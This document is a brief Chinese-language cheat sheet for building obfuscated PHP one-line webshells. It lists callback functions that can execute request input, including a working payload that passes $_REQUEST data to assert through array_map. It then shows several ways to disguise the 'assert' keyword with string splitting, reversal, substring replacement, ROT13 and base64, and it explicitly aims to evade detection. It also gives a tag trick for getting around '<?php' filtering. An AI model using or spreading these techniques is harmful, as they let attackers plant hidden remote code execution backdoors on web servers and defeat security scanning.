# Onefuck

---

**php**

回调函数

```
call_user_func_array()
call_user_func()
array_filter()
array_walk()
array_map()    : array_map("ass\x65rt",(array)$_REQUEST['a'])
registregister_shutdown_function()
register_tick_function()
filter_var()
filter_var_array()
uasort()
uksort()
array_reduce()
array_walk()
array_walk_recursive()
```

对关键字进行重组

```
explode()  # 切割字符串
如：$ch=explode('.','as.se.rt');$c=$ch[1].$ch[2].$ch[3];

strrev()   # 反转字符串
如：$c=strrev('tressa');//assert

substr()   # 返回字符串的子串
如：substr("abcdef",-1); //f
    substr("abcdef",-3,1); //d

substr_replace() # 替换字符串的子串
如：substr_replace('assexx','rt',4);,从第四位开始替换成rt 

```

对关键字编码，最好写在类函数里面能绕过一些检测

```
str_rot13()   # ROT13编码
如：$b=str_rot13('nffreg');//assert

base64_decode  # base64解码
如：$b=base64_decode('YXNzZXJ0');//assert
```

对<?php进行绕过

```
<?=一句话;
```



